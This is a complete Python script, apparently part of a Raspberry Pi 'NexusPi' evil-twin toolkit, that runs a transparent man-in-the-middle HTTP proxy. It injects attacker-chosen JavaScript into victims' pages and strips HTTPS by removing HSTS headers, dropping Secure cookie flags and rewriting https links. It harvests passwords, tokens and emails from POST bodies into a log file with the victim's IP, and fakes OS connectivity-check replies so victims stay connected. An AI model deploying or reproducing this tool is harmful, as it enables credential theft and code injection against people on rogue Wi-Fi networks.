#!/usr/bin/env python3
"""
NexusPi — proxy HTTP transparent avec injection JavaScript.

Lancé par eviltwin mitm mode + param inject_script.

Pipeline :
  iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j REDIRECT --to 8080
  ↓
  victime ──HTTP──> Pi:8080 (ce script)
                      └─> récupère destination orig. via SO_ORIGINAL_DST
                      └─> forward au vrai serveur
                      └─> dans réponse HTML : inject <script>...</script>
                      └─> renvoie à la victime

Usage : sudo python3 mitm_inject.py <port> <inject_script>

Limites :
  - HTTP only (TLS = illisible sans cert)
  - Pas de support chunked transfer-encoding robuste
  - Buffer entier en mémoire (OK pour pages typiques < 1 MB)
"""
import socket
import struct
import sys
import threading

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
INJECT_SCRIPT = sys.argv[2] if len(sys.argv) > 2 else "alert('NexusPi MITM')"
INJECTION_TAG = f"<script>{INJECT_SCRIPT}</script>".encode("utf-8") if INJECT_SCRIPT else b""

# SSLstrip2 : rewrite https:// → http:// dans les liens + attributs HTML.
# Active via env NEXUSPI_STRIP_HTTPS=1 (passé par wifi.py si l'utilisateur
# coche "SSL strip" en mode MITM). Limité par HSTS preload — les gros sites
# préchargés (google, facebook, twitter…) résistent.
import json
import os
import re
import time
STRIP_HTTPS = os.environ.get("NEXUSPI_STRIP_HTTPS") == "1"
CRED_LOG = os.environ.get("NEXUSPI_CRED_LOG", "")

# Couvre <a href>, <form action>, <link href>, <script src>, <img src>, etc.
_HTTPS_ATTR_RE = re.compile(
    rb'((?:href|src|action|content|srcset|poster|data|formaction)'
    rb'\s*=\s*["\'])'
    rb'https://',
    re.IGNORECASE,
)
# JS assignments : window.location = "https://..."
_HTTPS_JS_RE = re.compile(
    rb'((?:window|document|self|top|parent)\.(?:location|href|src)'
    rb'\s*=\s*["\'])'
    rb'https://',
    re.IGNORECASE,
)
# Champs de credentials à logger
_CRED_FIELDS = {
    "password", "passwd", "pass", "pwd", "mot_de_passe",
    "wifi_password", "secret", "token", "login", "username",
    "user", "email", "mail", "identifiant",
}

# Linux netfilter : valeur de SO_ORIGINAL_DST
SO_ORIGINAL_DST = 80


# Réponses instantanées pour les probes de captivité (sinon l'OS croit qu'il
# n'y a pas d'internet → warning "réseau limité" → la victime déconnecte).
# On reproduit exactement ce que chaque OS attend.
def _resp(status: int, ctype: str, body: bytes) -> bytes:
    status_msg = {200: "OK", 204: "No Content", 404: "Not Found"}.get(status, "OK")
    return (
        f"HTTP/1.1 {status} {status_msg}\r\n"
        f"Content-Type: {ctype}\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"Connection: close\r\n\r\n"
    ).encode("utf-8") + body


CAPTIVE_PROBES = {
    # Android
    "/generate_204": _resp(204, "text/html; charset=utf-8", b""),
    "/gen_204":      _resp(204, "text/html; charset=utf-8", b""),
    # iOS / macOS
    "/hotspot-detect.html": _resp(
        200, "text/html; charset=utf-8",
        b"<HTML><HEAD><TITLE>Success</TITLE></HEAD>"
        b"<BODY>Success</BODY></HTML>"),
    "/library/test/success.html": _resp(
        200, "text/html; charset=utf-8",
        b"<HTML><HEAD><TITLE>Success</TITLE></HEAD>"
        b"<BODY>Success</BODY></HTML>"),
    # Windows
    "/connecttest.txt": _resp(200, "text/plain", b"Microsoft Connect Test"),
    "/ncsi.txt":        _resp(200, "text/plain", b"Microsoft NCSI"),
    # Firefox
    "/canonical.html": _resp(200, "text/html; charset=utf-8",
        b"<html><body>success</body></html>"),
    # Ubuntu / divers Linux
    "/check_network_status.txt": _resp(200, "text/plain", b"NetworkManager is online"),
}


def get_original_dst(client_sock):
    """Récupère IP/port de destination AVANT REDIRECT par iptables."""
    try:
        raw = client_sock.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
        # struct sockaddr_in : family(2) port(2) addr(4) zero(8)
        family, port = struct.unpack("!HH", raw[:4])
        addr = socket.inet_ntoa(raw[4:8])
        return addr, port
    except Exception:
        return None, None


def inject_html(body: bytes) -> bytes:
    """Insère <script>...</script> juste avant </body>."""
    for tag in (b"</body>", b"</BODY>", b"</Body>"):
        if tag in body:
            return body.replace(tag, INJECTION_TAG + tag, 1)
    # Pas de </body> → on append à la fin (best effort)
    return body + INJECTION_TAG


def is_html_response(headers: bytes) -> bool:
    low = headers.lower()
    return (b"content-type: text/html" in low
            or b"content-type:text/html" in low)


def handle_client(client_sock):
    server_sock = None
    try:
        dst_ip, dst_port = get_original_dst(client_sock)
        if not dst_ip:
            return

        # 1. Lire la requête client (headers + éventuel body POST)
        client_sock.settimeout(2)
        request = b""
        while b"\r\n\r\n" not in request:
            chunk = client_sock.recv(4096)
            if not chunk:
                return
            request += chunk
            if len(request) > 65536:
                break

        # ★ Intercepter les probes de captivité OS pour répondre instantanément
        # → le téléphone pense qu'il y a internet, ne déconnecte pas.
        try:
            first_line = request.split(b"\r\n", 1)[0].decode("latin1", errors="ignore")
            parts = first_line.split(" ", 2)
            if len(parts) >= 2:
                path = parts[1].split("?")[0]
                if path in CAPTIVE_PROBES:
                    client_sock.sendall(CAPTIVE_PROBES[path])
                    return
        except Exception:
            pass

        # ★ Logger les POST contenant des credentials (HTTP uniquement)
        if CRED_LOG and request.startswith(b"POST "):
            try:
                hdr_e = request.find(b"\r\n\r\n")
                if hdr_e > 0:
                    post_body = request[hdr_e + 4:].decode("utf-8", errors="replace")
                    from urllib.parse import parse_qs
                    parsed = parse_qs(post_body)
                    creds = {}
                    for k, v in parsed.items():
                        if any(cf in k.lower() for cf in _CRED_FIELDS):
                            creds[k] = v[0] if v else ""
                    if creds:
                        client_ip = client_sock.getpeername()[0]
                        with open(CRED_LOG, "a", encoding="utf-8") as f:
                            f.write(f"{time.strftime('%Y-%m-%dT%H:%M:%S')}\t"
                                    f"{client_ip}\tMITM_CRED\t"
                                    f"{json.dumps({'host': dst_ip, **creds}, ensure_ascii=False)}\t"
                                    f"http-proxy\n")
            except Exception:
                pass

        # ★ Forcer Connection: close pour que le serveur ferme dès la réponse
        # finie (sinon keep-alive → on attend le timeout, 10s par requête).
        hdr_end = request.find(b"\r\n\r\n")
        if hdr_end > 0:
            headers_blob = request[:hdr_end]
            body_blob = request[hdr_end:]
            kept = []
            for h in headers_blob.split(b"\r\n"):
                lh = h.lower()
                if lh.startswith(b"connection:") or lh.startswith(b"proxy-connection:"):
                    continue
                # Accept-Encoding gzip/br → on aurait à décompresser pour injecter.
                # Plus simple : on supprime → serveur renvoie en clair.
                if lh.startswith(b"accept-encoding:"):
                    continue
                kept.append(h)
            kept.append(b"Connection: close")
            kept.append(b"Accept-Encoding: identity")
            request = b"\r\n".join(kept) + body_blob

        # 2. Forward au vrai serveur
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.settimeout(5)
        server_sock.connect((dst_ip, dst_port))
        server_sock.sendall(request)

        # 3. Lire toute la réponse jusqu'à close (rapide grâce à Connection:close)
        response = b""
        while True:
            try:
                chunk = server_sock.recv(32768)
            except socket.timeout:
                break
            if not chunk:
                break  # serveur a fermé → réponse complète
            response += chunk
            if len(response) > 10_000_000:
                break  # cap 10 MB

        # 4. Split headers / body
        hdr_end = response.find(b"\r\n\r\n")
        if hdr_end < 0:
            client_sock.sendall(response)
            return

        headers_blob = response[:hdr_end]
        body = response[hdr_end + 4:]

        # 5. Modifications si HTML : SSLstrip2 + Injection
        if is_html_response(headers_blob):
            modified = False
            # SSLstrip2 : retirer HSTS, Secure cookies, rewrite https → http
            if STRIP_HTTPS:
                # Retirer Strict-Transport-Security du header
                new_hdrs = []
                for h in headers_blob.split(b"\r\n"):
                    lh = h.lower()
                    if lh.startswith(b"strict-transport-security:"):
                        modified = True
                        continue
                    # Retirer flag Secure des cookies
                    if lh.startswith(b"set-cookie:"):
                        h = re.sub(rb';\s*[Ss]ecure', b'', h)
                        modified = True
                    new_hdrs.append(h)
                if modified:
                    headers_blob = b"\r\n".join(new_hdrs)
                # Rewrite tous les attributs HTML https → http
                new_body = _HTTPS_ATTR_RE.sub(rb'\1http://', body)
                # Rewrite JS assignments
                new_body = _HTTPS_JS_RE.sub(rb'\1http://', new_body)
                if new_body != body:
                    body = new_body
                    modified = True
            # Injection JS avant </body>
            if INJECTION_TAG:
                body_inj = inject_html(body)
                if body_inj != body:
                    body = body_inj
                    modified = True
            if modified:
                # Reconstruire les headers : virer Content-Length et chunked,
                # forcer Connection: close (client lira jusqu'à EOF).
                new_headers = []
                for h in headers_blob.split(b"\r\n"):
                    lh = h.lower()
                    if (lh.startswith(b"content-length:") or
                        lh.startswith(b"transfer-encoding:")):
                        continue
                    new_headers.append(h)
                new_headers.append(b"Connection: close")
                response = b"\r\n".join(new_headers) + b"\r\n\r\n" + body

        client_sock.sendall(response)
    except Exception:
        pass
    finally:
        for s in (client_sock, server_sock):
            try:
                if s:
                    s.close()
            except Exception:
                pass


def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", PORT))
    server.listen(64)
    while True:
        client, _ = server.accept()
        threading.Thread(target=handle_client, args=(client,), daemon=True).start()


if __name__ == "__main__":
    main()
